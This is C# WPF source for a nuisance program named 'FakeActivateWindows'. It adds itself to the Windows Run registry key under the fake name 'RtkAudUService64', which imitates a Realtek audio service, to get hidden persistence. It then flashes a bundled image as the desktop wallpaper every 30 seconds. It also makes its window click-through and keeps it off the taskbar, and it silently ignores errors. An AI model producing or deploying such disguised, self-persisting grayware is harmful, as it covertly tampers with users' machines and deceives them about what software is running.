using System;
using System.Runtime.InteropServices;
using System.Windows;
using System.Windows.Interop;
using Microsoft.Win32;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading.Tasks;

namespace FakeActivateWindows
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();

            AddToStartup();
            StartWallpaperGlitchLoop();
        }

        private async void StartWallpaperGlitchLoop()
        {
            try
            {
                string currentDir = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
                string imagePath = Path.Combine(currentDir, "background.jpg");

                while (true)
                {
                    await Task.Delay(30000);

                    if (File.Exists(imagePath))
                    {
                        string originalWallpaper = GetCurrentWallpaperPath();

                        SetWallpaper(imagePath);

                        await Task.Delay(1000);

                        if (!string.IsNullOrEmpty(originalWallpaper))
                        {
                            SetWallpaper(originalWallpaper);
                        }
                    }
                }
            }
            catch
            {
            }
        }

        private void AddToStartup()
        {
            try
            {
                string appName = "RtkAudUService64";
                string appPath = Process.GetCurrentProcess().MainModule.FileName;

                using (RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    rk.SetValue(appName, appPath);
                }
            }
            catch { }
        }

        const int SPI_GETDESKWALLPAPER = 0x0073;
        const int SPI_SETDESKWALLPAPER = 0x0014;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDCHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, StringBuilder lpvParam, int fuWinIni);

        private void SetWallpaper(string path)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }

        private string GetCurrentWallpaperPath()
        {
            StringBuilder sb = new StringBuilder(500);
            SystemParametersInfo(SPI_GETDESKWALLPAPER, sb.Capacity, sb, 0);
            return sb.ToString();
        }

        protected override void OnSourceInitialized(EventArgs e)
        {
            base.OnSourceInitialized(e);
            IntPtr hwnd = new WindowInteropHelper(this).Handle;
            SetupWindowStyle(hwnd);
        }

        const int WS_EX_TRANSPARENT = 0x00000020;
        const int WS_EX_TOOLWINDOW = 0x00000080;
        const int GWL_EXSTYLE = -20;

        [DllImport("user32.dll")]
        static extern int GetWindowLong(IntPtr hwnd, int index);

        [DllImport("user32.dll")]
        static extern int SetWindowLong(IntPtr hwnd, int index, int newStyle);

        private void SetupWindowStyle(IntPtr hwnd)
        {
            var extendedStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
            SetWindowLong(hwnd, GWL_EXSTYLE, extendedStyle | WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW);
        }
    }
}